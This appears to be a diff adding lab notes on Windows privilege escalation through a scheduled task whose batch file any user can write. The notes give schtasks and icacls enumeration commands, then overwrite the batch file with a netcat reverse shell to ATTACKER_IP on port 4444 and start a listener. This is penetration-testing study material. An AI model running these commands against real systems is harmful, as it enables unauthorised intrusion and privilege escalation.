@@ -1,0 +1,16 @@
+Scheduled Tasks: 
+Scheduled tasks can be listed from the command line using:
+1. schtasks
+To retrieve detailed information about any of the services, you can use a command like the following one:
+2. schtasks /query /tn vulntask /fo list /v
+If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user,
+resulting in a simple privilege escalation. To check the file permissions on the executable:
+3. icacls c:\tasks\schtask.bat
+group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.
+Let's change the bat file to spawn a reverse shell:
+4. echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
+5. nc -lvp 4444
+The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. 
+
+AlwaysInstallElevated:
